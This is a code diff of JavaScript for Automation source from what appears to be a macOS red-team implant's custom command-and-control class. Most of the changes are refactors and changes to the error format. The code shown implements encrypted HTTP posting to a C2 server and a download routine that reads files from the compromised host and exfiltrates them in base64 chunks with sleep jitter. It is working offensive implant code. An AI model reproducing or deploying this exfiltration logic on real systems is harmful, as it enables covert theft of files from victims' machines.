@@ -187,7 +187,7 @@ class customC2 extends baseC2{
 		return jsondata;
 	}
 	htmlPostData(urlEnding, sendData, json=true){
-	    var url = this.baseurl + urlEnding;
+	    let url = this.baseurl + urlEnding;
         //console.log(url);
         //encrypt our information before sending it
         if(this.aes_psk !== ""){
@@ -217,7 +217,6 @@ class customC2 extends baseC2{
                     //console.log(deepresp);
                     continue;
                 }
-
 				//console.log("response: " + resp.js);
 				if(!this.exchanging_keys){
 				    //we're not doing the initial key exchange
@@ -229,7 +228,6 @@ class customC2 extends baseC2{
                         }else{
                             return this.decrypt_message(resp);
                         }
-
 				    }else{
                         //we don't need to decrypt it, so we can just parse and return it
                         if(json){
@@ -237,7 +235,6 @@ class customC2 extends baseC2{
                         }else{
                             return resp.js;
                         }
-
 				    }
 				}
 				else{
@@ -287,9 +284,9 @@ class customC2 extends baseC2{
 	download(task, params){
         // download just has one parameter of the path of the file to download
         if( does_file_exist(params) ){
-            var offset = 0;
-            var url = "api/v" + this.api_version + "/responses/" + task.id;
-            var chunkSize = 512000; //3500;
+            let offset = 0;
+            let url = "api/v" + this.api_version + "/responses/" + task.id;
+            let chunkSize = 512000; //3500;
             // get the full real path to the file
             try{
                 if(params[0] !== "/"){
@@ -301,14 +298,14 @@ class customC2 extends baseC2{
                 // Get the file size by seeking;
                 var fileSize = handle.seekToEndOfFile;
             }catch(error){
-                output = JSON.stringify({'status': 'error', 'error': error.toString()})
+                output = JSON.stringify({'status': 'error', 'user_output': error.toString(), 'completed': true})
             }
 
             // always round up to account for chunks that are < chunksize;
-            var numOfChunks = Math.ceil(fileSize / chunkSize);
-            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'full_path': params});
-            var registerData = convert_to_nsdata(registerData);
-            var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
+            let numOfChunks = Math.ceil(fileSize / chunkSize);
+            let registerData = JSON.stringify({'total_chunks': numOfChunks, 'full_path': params});
+            registerData = convert_to_nsdata(registerData);
+            let registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
             //var registerFile = this.postResponse(task, registerData);
             if (registerFile['status'] === "success"){
                 handle.seekToFileOffset(0);
@@ -318,7 +315,7 @@ class customC2 extends baseC2{
                     // send a chunk
                     var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js,'file_id': registerFile['file_id']});
                     fileData = convert_to_nsdata(fileData);
-                    this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}))
+                    this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}));
                     //this.postResponse(task, fileData);
                     $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
 
@@ -328,14 +325,14 @@ class customC2 extends baseC2{
                     currentChunk += 1;
                     data = handle.readDataOfLength(chunkSize);
                 }
-                var output = JSON.stringify({"status":"finished", "file_id": registerFile['file_id']})
+                var output = JSON.stringify({"completed":true, "file_id": registerFile['file_id']})
             }
             else{
-               var output = JSON.stringify({'status': 'error', 'error': "Failed to register file to download"});
+               var output = JSON.stringify({'status': 'error', 'user_output': "Failed to register file to download", 'completed': true});
             }
         }
         else{
-            var output = JSON.stringify({'status': 'error', 'error': "file does not exist"});
+            var output = JSON.stringify({'status': 'error', 'user_output': "file does not exist", 'completed': true});
         }
         return output;
 	}
